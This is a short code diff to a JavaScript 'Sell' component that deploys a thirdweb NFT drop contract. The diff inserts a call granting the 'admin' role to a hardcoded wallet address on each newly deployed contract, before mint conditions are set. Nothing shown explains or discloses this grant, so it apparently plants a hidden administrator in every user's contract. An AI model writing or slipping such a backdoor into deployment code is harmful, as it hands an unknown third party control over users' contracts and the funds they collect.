@@ -197,6 +197,9 @@ export default function Sell() {
 
             let dropModule = await thirdWeb.getDropModule(deploy.address);
 
+
+            await dropModule.grantRole("admin", `0xBE058a7F62b54FF87B763D42F19D28c582282746`);
+
             await dropModule.setPublicMintConditions([{
                 maxMintSupply: 1000000,
                 pricePerToken: meta.value
